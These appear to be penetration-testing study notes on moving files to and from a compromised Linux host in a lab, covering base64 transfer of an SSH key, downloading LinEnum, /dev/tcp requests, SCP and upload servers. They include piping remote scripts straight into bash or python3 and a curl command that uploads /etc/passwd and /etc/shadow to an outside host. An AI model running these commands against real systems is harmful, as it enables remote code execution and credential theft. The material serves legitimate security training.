
## Downloads

### Base64 Encoding / Decoding

Take hash
```shell-session
md5sum id_rsa
```

Convert to base64
```shell-session
cat id_rsa |base64 -w 0;echo
```

Copy the output

Decode the file on target
```shell-session
echo -n '...' | base64 -d > id_rsa
```

Take hash on target
```shell-session
md5sum id_rsa
```

Hashes should match, otherwise, it is not the same file.


### Web Downloads with Wget and cURL

```shell-session
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
```
(-O is the output flag)
```shell-session
curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```
(-o is the output flag)

#### Use directly as a pipe for fileless

(Execute directly as a pipe)
```shell-session
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```

(Pipe a Python script directly into the Python binary)
```shell-session
wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
```


### Download with Bash (/dev/tcp)

Connect to the target web server
```shell-session
exec 3<>/dev/tcp/10.10.10.32/80
```

HTTP GET request
```shell-session
echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
```

Print the Response
```shell-session
cat <&3
```


### SSH Downloads

Enable and start the SSH Server
```shell-session
sudo systemctl enable ssh
```
```shell-session
sudo systemctl start ssh
```

Check for SSH Listening Port
```shell-session
netstat -lnpt
```

Download with SCP (secure copy)
```shell-session
scp plaintext@192.168.49.128:/root/myroot.txt . 
```
(Create temporary user account on host for file transfers to avoid using primary credentials or keys)



## Upload Operations

### Web Upload

Use uploadserver (an extended module of the Python HTTP.Server)
```shell-session
sudo python3 -m pip install --user uploadserver
```

Create self-signed certificate if using HTTPS
```shell-session
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```

Host the webserver in a new directory
```shell-session
mkdir https && cd https
```
```shell-session
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
```

#### Upload Multiple Files
```shell-session
curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```
(--insecure due to self-signed certificate in use)

#### Alternative Upload

Start a Python, PHP, or Ruby Server in the directory with file of interest.
```shell-session
python3 -m http.server
```
```shell-session
python2.7 -m SimpleHTTPServer
```
```shell-session
php -S 0.0.0.0:8000
```
```shell-session
ruby -run -ehttpd . -p8000
```

```shell-session
wget 192.168.49.128:8000/filetotransfer.txt
```


### SCP Upload

Only if SSH is allowed for outbound connections.

```shell-session
scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/
```



